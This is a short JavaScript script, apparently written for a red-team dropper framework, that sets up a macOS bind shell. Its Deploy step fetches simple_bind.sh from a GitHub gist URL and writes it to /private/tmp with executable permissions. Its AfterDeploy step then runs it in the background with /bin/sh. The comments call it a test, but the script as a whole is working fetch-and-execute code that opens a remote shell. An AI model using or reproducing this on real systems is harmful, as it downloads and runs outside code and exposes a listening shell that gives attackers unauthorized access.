// genesis script, spawns a generic bind shell in the background

function BeforeDeploy() {
  console.log("Testing generic OSX bind shell pulled from the web");
  return true; 
}

function Deploy() {
  var url = "https://gist.githubusercontent.com/ahhh/609cdf5abaa22e233976aec55a3e0dfd/raw/20cce584caeab27c3be3a7a612fda0ec3e99f94d/simple_bind.sh";
  var file_3 = "/private/tmp/bind.sh";
  var response2 = HTTPGetFile(url);
  var response3 = WriteFile(file_3, response2, 0755);
  hash = MD5(file_3);
  console.log("MD5 of " + file_3 + ": " + hash);
  return true;
}

function AfterDeploy() {
  ForkExecuteCommand("/bin/sh", ["/private/tmp/bind.sh"]);
  console.log("Test complete.");
  return true;
}
